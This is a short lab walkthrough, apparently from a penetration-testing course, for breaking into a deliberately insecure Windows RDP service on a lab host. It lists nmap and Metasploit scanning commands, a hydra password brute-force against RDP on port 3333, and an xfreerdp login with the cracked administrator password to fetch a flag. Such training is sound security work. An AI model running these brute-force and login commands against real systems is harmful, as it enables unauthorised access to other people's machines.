# Windows: Insecure RDP Service

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2415–2450. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo.ine.local** running a vulnerable RDP service.

**Objective:** To fingerprint the running RDP service, then exploit the vulnerability using the appropriate method and retrieve the flag!.

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

**Dictionaries to use:**

- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Tools: Nmap, searchsploit, msfconsole,xfreerdp

```bash
ping -c 4 demo.ine.local
nmap -sV demo.ine.local
//auxiliary module on port 3333 if it’s running RDP

msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333

xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333

Got to “My Computer” → C:\

Open flag file.

```
